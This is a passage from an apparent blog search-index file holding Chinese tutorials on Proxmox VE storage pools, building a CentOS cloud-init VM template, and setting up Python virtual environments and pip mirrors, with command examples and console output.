存储池不能被多个节点同时共享使用，只能用于节点本地存储.</p>\n</blockquote>\n<p>创建和管理 LVM-thin 存储池的命令和 LVM 命令完全一致(参见 man lvmthin)。假定你已 经有一个 LVM 卷组 pve，如下命令可以创建一个名为 data 的新 LVM-thin 存储池(容量 100G):</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">lvcreate -L 100G -n data pve</span><br><span class=\"line\">lvconvert --type thin-pool pve/data</span><br></pre></td></tr></table></figure>\n\n<p>也可以在PVE的GUI界面进行操作。</p>\n<img src=\"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/shot4.png\" class=\"\">\n\n<h3 id=\"4-网络文件系统（NFS）\"><a href=\"#4-网络文件系统（NFS）\" class=\"headerlink\" title=\"4. 网络文件系统（NFS）\"></a>4. 网络文件系统（NFS）</h3><p>基于 NFS 的后端存储服务实际上建立在目录后端存储之上，其属性和目录后端存储非常相似。其中子目录布局和文件命名规范完全一致。<br>NFS 后端存储的优势在于，你可以通过配置 NFS 服务器参数，实现 NFS 存储服务自动挂载，而无需编辑修改&#x2F;etc&#x2F;fstab 文件。</p>\n<p>NFS 存储服务能够自动检测 NFS 服务器的在线状态，并自动连接 NFS 服务器输出的共享存储服务。</p>\n<h3 id=\"5-Windows文件共享（CIFS）\"><a href=\"#5-Windows文件共享（CIFS）\" class=\"headerlink\" title=\"5. Windows文件共享（CIFS）\"></a>5. Windows文件共享（CIFS）</h3><p>CIFS（Common Internet File System）就是 SMB 的改进版本。Windows的文件共享其实就是使用了 SMB或者说 CIFS。<br>基于 CIFS 的后端存储可用于扩展基于目录的存储，这样就无需再手工配置 CIFS 挂载。该类 型存储可直接通过 Proxmox VE API 或 WebUI 添加。服务器心跳检测或共享输出选项等后端 存储参数配置也将自动完成配置。</p>\n<h2 id=\"三、PVE默认安装的实例分析\"><a href=\"#三、PVE默认安装的实例分析\" class=\"headerlink\" title=\"三、PVE默认安装的实例分析\"></a>三、PVE默认安装的实例分析</h2><p>在默认安装完成后，PVE将后端存储的配置文件存放在<code>/etc/pve/storage.cfg</code>中。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@pve01:~# cat /etc/pve/storage.cfg</span><br><span class=\"line\">dir: local</span><br><span class=\"line\">    path /var/lib/vz</span><br><span class=\"line\">    content vztmpl,iso,backup</span><br><span class=\"line\"></span><br><span class=\"line\">lvmthin: local-lvm</span><br><span class=\"line\">    thinpool data</span><br><span class=\"line\">    vgname pve</span><br><span class=\"line\">    content images,rootdir</span><br><span class=\"line\"></span><br><span class=\"line\">nfs: nfs130</span><br><span class=\"line\">    export /data/nfs</span><br><span class=\"line\">    path /mnt/pve/nfs130</span><br><span class=\"line\">    server 192.168.0.130</span><br><span class=\"line\">    content images</span><br></pre></td></tr></table></figure>\n\n<p>PVE默认存储配置至少包含了2个资源池（Storage Pools）：</p>\n<ul>\n<li>local<br>基于目录模式，用于iso、vztmpl、backup、snippets等文件存储。<br>物理资源位于<code>/dev/sda3</code>磁盘分区，逻辑卷是<code>pve-root</code><br>mount挂载点是<code>/var/lib/vz</code>。</li>\n<li>local-lvm<br>基于薄模式的逻辑卷，用于存储容器的系统盘rootdir，和数据盘image。<br>物理资源位于<code>/dev/sda3</code>磁盘分区，逻辑卷分为两个部分：管理元数据的<code>pve-data_tmeta</code>，和管理实际数据的<code>pve-data_tdeta</code></li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@pve01:~# lsblk</span><br><span class=\"line\">NAME                            MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT</span><br><span class=\"line\">sda                               8:0    0 111.8G  0 disk </span><br><span class=\"line\">├─sda1                            8:1    0  1007K  0 part </span><br><span class=\"line\">├─sda2                            8:2    0   512M  0 part /boot/efi</span><br><span class=\"line\">└─sda3                            8:3    0 111.3G  0 part </span><br><span class=\"line\">  ├─pve-swap                    253:0    0     8G  0 lvm  [SWAP]</span><br><span class=\"line\">  ├─pve-root                    253:1    0  27.8G  0 lvm  /</span><br><span class=\"line\">  ├─pve-data_tmeta              253:2    0     1G  0 lvm  </span><br><span class=\"line\">  │ └─pve-data-tpool            253:4    0  59.7G  0 lvm  </span><br><span class=\"line\">  │   ├─pve-data                253:5    0  59.7G  0 lvm  </span><br><span class=\"line\">  │   ├─pve-vm--198--cloudinit  253:7    0     4M  0 lvm  </span><br><span class=\"line\">  │   ├─pve-vm--198--disk--0    253:8    0     4G  0 lvm  </span><br><span class=\"line\">  │   ├─pve-vm--199--disk--0    253:9    0     4G  0 lvm  </span><br><span class=\"line\">  │   ├─pve-vm--199--cloudinit  253:10   0     4M  0 lvm  </span><br><span class=\"line\">  │   ├─pve-vm--121--cloudinit  253:11   0     4M  0 lvm  </span><br><span class=\"line\">  │   └─pve-base--121--disk--0  253:26   0     4G  1 lvm  </span><br><span class=\"line\">  └─pve-data_tdata              253:3    0  59.7G  0 lvm  </span><br><span class=\"line\">    └─pve-data-tpool            253:4    0  59.7G  0 lvm  </span><br><span class=\"line\">      ├─pve-data                253:5    0  59.7G  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--198--cloudinit  253:7    0     4M  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--198--disk--0    253:8    0     4G  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--199--disk--0    253:9    0     4G  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--199--cloudinit  253:10   0     4M  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--121--cloudinit  253:11   0     4M  0 lvm  </span><br><span class=\"line\">      ├─pve-vm--199--state--dns 253:17   0   1.5G  0 lvm  </span><br><span class=\"line\">      └─pve-base--121--disk--0  253:26   0     4G  1 lvm  </span><br><span class=\"line\">nvme0n1                         259:0    0   477G  0 disk </span><br><span class=\"line\">├─data02-data02_tmeta           253:23   0   4.8G  0 lvm  </span><br><span class=\"line\">│ └─data02-data02               253:28   0 467.3G  0 lvm  </span><br><span class=\"line\">└─data02-data02_tdata           253:27   0 467.3G  0 lvm  </span><br><span class=\"line\">  └─data02-data02               253:28   0 467.3G  0 lvm  </span><br><span class=\"line\"></span><br><span class=\"line\">root@pve01:/var/lib/vz# tree /var/lib/vz</span><br><span class=\"line\">/var/lib/vz</span><br><span class=\"line\">├── dump</span><br><span class=\"line\">│   ├── vzdump-qemu-120-2021_01_18-00_17_53.log</span><br><span class=\"line\">│   └── vzdump-qemu-120-2021_01_18-00_17_53.vma.zst</span><br><span class=\"line\">├── images</span><br><span class=\"line\">└── template</span><br><span class=\"line\">    ├── cache</span><br><span class=\"line\">    │   ├── alpine-3.11-default_20200425_amd64.tar.xz</span><br><span class=\"line\">    │   ├── centos-7-default_20190926_amd64.tar.xz</span><br><span class=\"line\">    │   └── ubuntu-18.04-standard_18.04.1-1_amd64.tar.gz</span><br><span class=\"line\">    ├── iso</span><br><span class=\"line\">    │   ├── CentOS-7-x86_64-DVD-2003.iso</span><br><span class=\"line\">    │   ├── CentOS-7-x86_64-Minimal-2003.iso</span><br><span class=\"line\">    │   └── ubuntu-18.04.4-live-server-amd64.iso</span><br><span class=\"line\">    └── qemu</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、结论\"><a href=\"#四、结论\" class=\"headerlink\" title=\"四、结论\"></a>四、结论</h2><ul>\n<li>PVE安装后，将默认提供基于dir的<code>local</code>资源池，和基于LVM-thin的<code>local-lvm</code>资源池。</li>\n<li>对于容器管理的场景，LVM-thin是最佳方案。<br>优点一是基于宿主机的本地磁盘，可靠性高，性能好，二是动态的容量管理，“用多少是多少”；<br>缺点是不支持PVE多节点的共享。</li>\n<li>对于备份和快照管理的场景，NFS是最佳方案。<br>优点是部署配置简单，可以支持多容器的共享存储；<br>缺点是依赖网络和外部服务器，可靠性较低，性能也受限。<br>特别指出，如果已经有WDCLOUD之类的网络存储，直接用CIFS更方便，无需单独部署NFS服务器。</li>\n<li>LVM方案的功能和LVM-thin基本类似，但配置更复杂、资源利用率低，不建议使用。<br>其唯一的价值在于，如果后端存储是iSCSI或FC类型的高端的集中式存储设备，可以支持多容器之间的共享。</li>\n<li>GlusterFS 和Ceph都是典型的分布式存储系统，都提供文件存储、块存储功能（在应用层面还提供对象存储功能）</li>\n<li>ZFS的性能非常好，提供copy-on-write，快照、存储空间池等高级功能，但其设计思想仍然是传统的基于磁盘管理的文件系统<br>ZFS的重要价值在于，可以通过适度的CPU和内存负载以及简单的管理来取代成本高昂的硬件RAID卡</li>\n</ul>\n<hr>\n<h2 id=\"附录1：安装LVM2\"><a href=\"#附录1：安装LVM2\" class=\"headerlink\" title=\"附录1：安装LVM2\"></a>附录1：安装LVM2</h2><p>Centos基本安装包并不包含LVM管理功能，需用<code>yum install lvm2</code>自行安装。</p>\n<ul>\n<li>PV（Physical Volume）- 物理卷<br>  物理卷在逻辑卷管理中处于最底层，它可以是实际物理硬盘上的分区，也可以是整个物理硬盘，也可以是raid设备。</li>\n<li>VG（Volumne Group）- 卷组<br>  卷组建立在物理卷之上，一个卷组中至少要包括一个物理卷，在卷组建立之后可动态添加物理卷到卷组中。一个逻辑卷管理系统工程中可以只有一个卷组，也可以拥有多个卷组。</li>\n<li>LV（Logical Volume）- 逻辑卷<br>  逻辑卷建立在卷组之上，卷组中的未分配空间可以用于建立新的逻辑卷，逻辑卷建立后可以动态地扩展和缩小空间。系统中的多个逻辑卷可以属于同一个卷组，也可以属于不同的多个卷组。</li>\n</ul>\n<img src=\"/2021/01/17/Proxmox-VE%E7%9A%84%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E5%B0%8F%E7%BB%93/lvm2.png\" class=\"\">\n\n<p>在安装lvm2后，就可以使用以下命令了。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@pve01:~# pvs</span><br><span class=\"line\">  PV           VG           Fmt  Attr PSize    PFree  </span><br><span class=\"line\">  /dev/nvme0n1 date-nvme0n1 lvm2 a--  &lt;476.94g 124.00m</span><br><span class=\"line\">  /dev/sda3    pve          lvm2 a--  &lt;111.29g  13.87g</span><br><span class=\"line\">root@pve01:~# vgs</span><br><span class=\"line\">  VG           #PV #LV #SN Attr   VSize    VFree  </span><br><span class=\"line\">  date-nvme0n1   1   1   0 wz--n- &lt;476.94g 124.00m</span><br><span class=\"line\">  pve            1  24   0 wz--n- &lt;111.29g  13.87g</span><br><span class=\"line\">root@pve01:~# lvs</span><br><span class=\"line\">  LV                     VG           Attr       LSize    Pool Origin          Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class=\"line\">  date-nvme0n1           date-nvme0n1 twi-aotz-- &lt;467.28g                      0.00   0.37                            </span><br><span class=\"line\">  base-120-disk-0        pve          Vri-a-tz-k    4.00g data                 38.28                                  </span><br><span class=\"line\">  base-121-disk-0        pve          Vri-a-tz-k    4.00g data                 38.53                                  </span><br><span class=\"line\">  base-122-disk-0        pve          Vri-a-tz-k    8.00g data                 54.14                                  </span><br><span class=\"line\">  data                   pve          twi-aotz--   59.66g                      42.54  2.87                            </span><br><span class=\"line\">  root                   pve          -wi-ao----   27.75g                                                             </span><br><span class=\"line\">  snap_vm-199-disk-0_dns pve          Vri---tz-k    4.00g data vm-199-disk-0                                          </span><br><span class=\"line\">  swap                   pve          -wi-ao----    8.00g                                                             </span><br><span class=\"line\">  vm-100-cloudinit       pve          Vwi-a-tz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-100-disk-0          pve          Vwi-a-tz--   12.00g data                 59.46                                  </span><br><span class=\"line\">  vm-120-cloudinit       pve          Vwi-a-tz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-121-cloudinit       pve          Vwi-a-tz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-122-cloudinit       pve          Vwi-a-tz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-160-disk-0          pve          Vwi-aotz--    8.00g data                 7.74                                   </span><br><span class=\"line\">  vm-198-cloudinit       pve          Vwi-aotz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-198-disk-0          pve          Vwi-aotz--    4.00g data                 38.55                                  </span><br><span class=\"line\">  vm-199-cloudinit       pve          Vwi-aotz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-199-disk-0          pve          Vwi-aotz--    4.00g data                 38.56                                  </span><br><span class=\"line\">  vm-199-state-dns       pve          Vwi-a-tz--   &lt;1.49g data                 33.03                                  </span><br><span class=\"line\">  vm-200-cloudinit       pve          Vwi-aotz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-200-disk-0          pve          Vwi-aotz--    4.00g data                 38.58                                  </span><br><span class=\"line\">  vm-222-cloudinit       pve          Vwi-a-tz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-222-disk-0          pve          Vwi-a-tz--    4.00g data                 54.27                                  </span><br><span class=\"line\">  vm-223-cloudinit       pve          Vwi-aotz--    4.00m data                 9.38                                   </span><br><span class=\"line\">  vm-223-disk-0          pve          Vwi-aotz--    8.00g data base-122-disk-0 85.10 </span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://blog.51cto.com/6222666/2161799\">Proxmox VE 安装的系列教程</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/145862221\">Proxmox虚拟系统PVE的磁盘分区及文件系统分析总结</a></li>\n<li><a href=\"https://blog.csdn.net/u011069498/article/details/96303220\">CentOS7 LVM与RAID简单使用</a></li>\n<li><a href=\"http://einverne.github.io/post/2020/03/proxmox-install-and-setup.html\">Proxmox 安装和设置</a></li>\n<li><a href=\"https://post.smzdm.com/p/768830/\">ProXmoX VE 安装及基础配置</a></li>\n</ul>\n"},{"title":"Proxmox VE虚拟机的Cloud-init安装记录","url":"/2020/08/02/Proxmox-VE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84Cloud-init%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>Cloud-init的原理，就是给VM增加一个CDROM设备，配合操作系统安装的cloud-init软件包，以便在启动时自动读取网络设置参数。</p>\n<img src=\"/2020/08/02/Proxmox-VE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84Cloud-init%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/hardware.png\" class=\"\">\n\n<p>这个Cloud-init设备的路径一般为<code>/dev/sr0</code>, 大小约为4M，其中包含三个文件，这就是元数据了。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]<span class=\"comment\"># tree /mnt</span></span><br><span class=\"line\">/mnt</span><br><span class=\"line\">├── meta-data</span><br><span class=\"line\">├── network-config</span><br><span class=\"line\">└── user-data</span><br></pre></td></tr></table></figure>\n\n<p>下图就标注了Cloud-init所有可以配置的参数信息。</p>\n<img src=\"/2020/08/02/Proxmox-VE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84Cloud-init%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/cloud-init.png\" class=\"\">\n\n<h2 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h2><h3 id=\"1-安装Centos-7-8操作系统\"><a href=\"#1-安装Centos-7-8操作系统\" class=\"headerlink\" title=\"1. 安装Centos 7.8操作系统\"></a>1. 安装Centos 7.8操作系统</h3><p>首先创建一个虚拟机并加载Centos系统安装ISO文件，基本配置建议为：1vCPU，1024M内存，4G硬盘，网卡无所谓。注意暂时先不启动！！<br>然后，在PVE控制台上为该虚拟机增加一个Cloud init设备，稍等初始化完成，开始启动VM进行操作系统安装。<br>在安装Centos时，注意手工建立磁盘分区，只留一个启动分区，EFI-Boot和Swap分区都不要了，参见下图。</p>\n<img src=\"/2020/08/02/Proxmox-VE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84Cloud-init%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/disk-partition.png\" class=\"\">\n\n<p>系统安装完成后，检查是否可以正常启动。</p>\n<blockquote>\n<p>新系统装完后，必须将网卡配置文件内的onboot打开，清除uuid！！！<br>创建Ubuntu的VM，Cloud-Init设备必须使用<code>virtio-scsi-pci</code>类型的驱动程序</p>\n</blockquote>\n<h3 id=\"2-关闭selinux和firewalld以及碍事的NetworkManager\"><a href=\"#2-关闭selinux和firewalld以及碍事的NetworkManager\" class=\"headerlink\" title=\"2. 关闭selinux和firewalld以及碍事的NetworkManager\"></a>2. 关闭selinux和firewalld以及碍事的NetworkManager</h3><blockquote>\n<p>selinux的真实配置文件路径是<code>/etc/selinux/config</code>,而<code>/etc/sysconfig/selinux</code>实际是它的软链接文件。<br>检查selinux状态可以使用<code>sestatus</code>命令。</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 关闭Selinux</span></span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/SELINUX=enforcing/SELINUX=disabled/g&#x27;</span> /etc/selinux/config</span><br><span class=\"line\">setenforce 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 关闭Firewalld</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> --now firewalld</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 关闭NetworManager</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> --now NetworkManager</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置Linunx内核，允许IP转发</span></span><br><span class=\"line\">modprobe br_netfilter</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;net.ipv4.ip_forward = 1&quot;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;net.bridge.bridge-nf-call-ip6tables = 1&quot;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;net.bridge.bridge-nf-call-iptables = 1&quot;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\">sysctl -p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 配置启动时自动加载br_netfilter模块</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/rc.sysinit &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"string\">for file in /etc/sysconfig/modules/*.modules ; do</span></span><br><span class=\"line\"><span class=\"string\">[ -x $file ] &amp;&amp; $file</span></span><br><span class=\"line\"><span class=\"string\">done</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;modprobe br_netfilter&#x27;</span> &gt; /etc/sysconfig/modules/br_netfilter.modules</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 755 /etc/sysconfig/modules/br_netfilter.modules</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>netfilter是Linux内核的包过滤框架，它提供了一系列的钩子（Hook）供其他模块控制包的流动，配置Linux内核防火墙的命令行工具iptables就是基于netfilter机制的。<br>注意：服务器重启后<code>sysctl</code>命令报错，原因大概是br_netfilter模块未被自动加载，考虑通过配置<code>/etc/rc.sysinit</code>来解决！</p>\n</blockquote>\n<h3 id=\"3-安装必要的虚拟化软件和工具软件\"><a href=\"#3-安装必要的虚拟化软件和工具软件\" class=\"headerlink\" title=\"3. 安装必要的虚拟化软件和工具软件\"></a>3. 安装必要的虚拟化软件和工具软件</h3><p>为了让虚拟化层可以重启和关闭虚拟机，必须安装acpid服务；<br>为了使根分区正确调整大小安装cloud-utils-growpart，cloud-init支持下发前设置信息写入。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y acpid cloud-init cloud-utils-growpart</span><br><span class=\"line\">yum install -y git wget yum-utils net-tools bind-utils</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> acpid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 禁用zeroconf(零配置网络服务规范)，该协议目的是在系统无法连接DHCP服务的时候，尝试获取类似169.254.0.0的保留IP</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;NOZEROCONF=yes&quot;</span> &gt;&gt; /etc/sysconfig/network</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 防止ssh连接使用dns导致访问过慢</span></span><br><span class=\"line\">sed -ri <span class=\"string\">&#x27;/UseDNS/&#123;s@#@@;s@\\s+.+@ no@&#125;&#x27;</span> /etc/ssh/sshd_config</span><br><span class=\"line\">systemctl restart sshd</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-设置cloud-init\"><a href=\"#4-设置cloud-init\" class=\"headerlink\" title=\"4. 设置cloud-init\"></a>4. 设置cloud-init</h3><p>设置允许root登录，允许输入口令，禁止第一次启动后yum更新软件</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed -ri <span class=\"string\">&#x27;/disable_root/&#123;s#\\S$#0#&#125;&#x27;</span> /etc/cloud/cloud.cfg</span><br><span class=\"line\">sed -ri <span class=\"string\">&#x27;/ssh_pwauth/&#123;s#\\S$#1#&#125;&#x27;</span> /etc/cloud/cloud.cfg</span><br><span class=\"line\">sed -ri <span class=\"string\">&#x27;/package-update/s@^@#@&#x27;</span> /etc/cloud/cloud.cfg</span><br></pre></td></tr></table></figure>\n\n<p>默认cloud-init会创建一个系统类型的centos用户，手工编辑配置文件取消掉。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#  default_user:</span><br><span class=\"line\">#    name: centos</span><br><span class=\"line\">#    lock_passwd: true</span><br><span class=\"line\">#    gecos: Cloud User</span><br><span class=\"line\">#    groups: [wheel, adm, systemd-journal]</span><br><span class=\"line\">#    sudo: [&quot;ALL=(ALL) NOPASSWD:ALL&quot;]</span><br><span class=\"line\">#    shell: /bin/bash</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-虚拟机关机，并在PVE控制台上将其转换为模版templete，母鸡就此完成\"><a href=\"#5-虚拟机关机，并在PVE控制台上将其转换为模版templete，母鸡就此完成\" class=\"headerlink\" title=\"5. 虚拟机关机，并在PVE控制台上将其转换为模版templete，母鸡就此完成\"></a>5. 虚拟机关机，并在PVE控制台上将其转换为模版templete，母鸡就此完成</h3><h2 id=\"使用Cloud-init模版克隆新的虚拟机\"><a href=\"#使用Cloud-init模版克隆新的虚拟机\" class=\"headerlink\" title=\"使用Cloud-init模版克隆新的虚拟机\"></a>使用Cloud-init模版克隆新的虚拟机</h2><p>在PVE控制台选中模版，右键选择<code>Clone</code>，在弹出对话框中设置就可以了。<br>注意，一般选择<code>Full Clone</code>，相比<code>Link Clone</code>更安全，但是要多花一点硬盘空间就是了。</p>\n<img src=\"/2020/08/02/Proxmox-VE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84Cloud-init%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/clone.png\" class=\"\">\n\n<p>创建小鸡需要花一点时间写盘，此时VM被锁定，等锁定解除后就可以设置Cloud-init的信息，并启动小鸡了。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><p><a href=\"https://kinkinlu.com/2019/04/18/proxmox%E4%B8%ADcloud-init%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/\">proxmox中cloud-init使用方法</a></p>\n</li>\n<li><p><a href=\"https://xixiliguo.github.io/post/cloud-init-1/\">Cloud-init的基本原理</a></p>\n</li>\n<li><p><a href=\"https://qizhanming.com/blog/2018/08/08/how-to-install-nfs-on-centos-7\">CentOS 7 下 yum 安装和配置 NFS</a></p>\n</li>\n<li><p><a href=\"https://pve.proxmox.com/wiki/Cloud-Init_Support\">PVE CLoud-Init的官方文档</a></p>\n</li>\n<li><p><a href=\"https://feisky.gitbooks.io/sdn/content/linux/iptables.html\">Linux网络配置的白皮书</a></p>\n</li>\n<li><p><a href=\"https://www.icode9.com/content-4-718596.html\">一种自动加载br_netfilter模块的方法</a></p>\n</li>\n</ul>\n"},{"title":"Python 经验汇编","url":"/2024/09/22/Python-%E7%BB%8F%E9%AA%8C%E6%B1%87%E7%BC%96/","content":"<h2 id=\"1-虚拟环境安装\"><a href=\"#1-虚拟环境安装\" class=\"headerlink\" title=\"1. 虚拟环境安装\"></a>1. 虚拟环境安装</h2><p>参考 <a href=\"https://liaoxuefeng.com/books/python/built-in-modules/venv/\">Python教程 - 廖雪峰</a>。</p>\n<p>注意找到正确的 Python 执行码版本，常见目录包括：</p>\n<ul>\n<li>Conda安装：<code>/usr/local/anaconda3/</code></li>\n<li>操作系统内置Python2：<code>/System/Library/Frameworks/Python.framework/Versions/</code></li>\n<li>官方Python3：<code>/Library/Frameworks/Python.framework/Versions/</code></li>\n</ul>\n<p>在当前的<code>.venv</code>子目录，安装虚拟环境</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -m venv .venv</span><br></pre></td></tr></table></figure>\n\n<p>安装结果如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">sj@JiandeiMac signal-test % ls -l .venv</span><br><span class=\"line\">total 16</span><br><span class=\"line\">drwxr-xr-x  33 sj  staff  1056  9 21 23:56 bin</span><br><span class=\"line\">drwxr-xr-x   3 sj  staff    96  9 21 22:50 include</span><br><span class=\"line\">drwxr-xr-x   3 sj  staff    96  9 21 22:50 lib</span><br><span class=\"line\">-rw-r--r--   1 sj  staff   224  9 21 22:50 pyvenv.cfg</span><br><span class=\"line\">drwxr-xr-x   3 sj  staff    96  9 21 22:53 share</span><br></pre></td></tr></table></figure>\n\n<p>激活虚拟环境</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">source .venv/bin/activate</span><br></pre></td></tr></table></figure>\n\n<p>显示当前已安装的软件包，默认只有pip，很干净！！！</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">(.venv) sj@JiandeiMac aaa % pip3 list</span><br><span class=\"line\">Package Version</span><br><span class=\"line\">------- -------</span><br><span class=\"line\">pip     24.0</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-设置国内安装源\"><a href=\"#2-设置国内安装源\" class=\"headerlink\" title=\"2. 设置国内安装源\"></a>2. 设置国内安装源</h2><h3 id=\"一次性的替换源\"><a href=\"#一次性的替换源\" class=\"headerlink\" title=\"一次性的替换源\"></a>一次性的替换源</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip3 install numpy -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"永久的替换源\"><a href=\"#永久的替换源\" class=\"headerlink\" title=\"永久的替换源\"></a>永久的替换源</h3><p>查看pip的配置信息， <code>pip3 config list</code>，但是更好的是<code>pip3 config debug</code></p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">(.venv) sj@JiandeiMac aaa % pip3 config debug</span><br><span class=\"line\">env_var:</span><br><span class=\"line\">env:</span><br><span class=\"line\">global:</span><br><span class=\"line\">  /Library/Application Support/pip/pip.conf, exists: False</span><br><span class=\"line\">site:</span><br><span class=\"line\">  /Users/sj/MyProject/aaa/.venv/pip.conf, exists: False</span><br><span class=\"line\">user:</span><br><span class=\"line\">  /Users/sj/.pip/pip.conf, exists: False</span><br><span class=\"line\">  /Users/sj/.config/pip/pip.conf, exists: True</span><br><span class=\"line\">    global.index-url: http://mirrors.aliyun.com/pypi/simple/</span><br><span class=\"line\">    install.trusted-host: mirrors.aliyun.com</span><br></pre></td></tr></table></figure>\n\n<p>配置文件名为<code>pip.conf</code>，路径依次为：系统安装目录—当前虚拟环境—当前用户归属目录</p>\n<p>以<code>/Users/sj/.config/pip/pip.conf</code>为例，也可以用于<code>.venv/pip.conf</code>，其内容为：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[global]</span><br><span class=\"line\">index-url = http://mirrors.aliyun.com/pypi/simple/</span><br><span class=\"line\"></span><br><span class=\"line\">[install]</span><br><span class=\"line\">trusted-host = mirrors.aliyun.com</span><br></pre></td></tr></table></figure>\n\n<p>也可以使用命令行方式，但要注意实际修改了哪个配置文件：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip3 config set global.index-url http://mirrors.aliyun.com/pypi/simple/</span><br><span class=\"line\">pip3 config set install.trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"多个源的设置方法\"><a href=\"#多个源的设置方法\" class=\"headerlink\" title=\"多个源的设置方法\"></a>多个源的设置方法</h3><p>注意，<code>index-url</code>字段只能有一个地址，其他在<code>extra-index-url</code>字段</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[global]</span><br><span class=\"line\">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class=\"line\">extra-index-url=</span><br><span class=\"line\">    https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class=\"line\">    https://pypi.douban.com/simple/</span><br><span 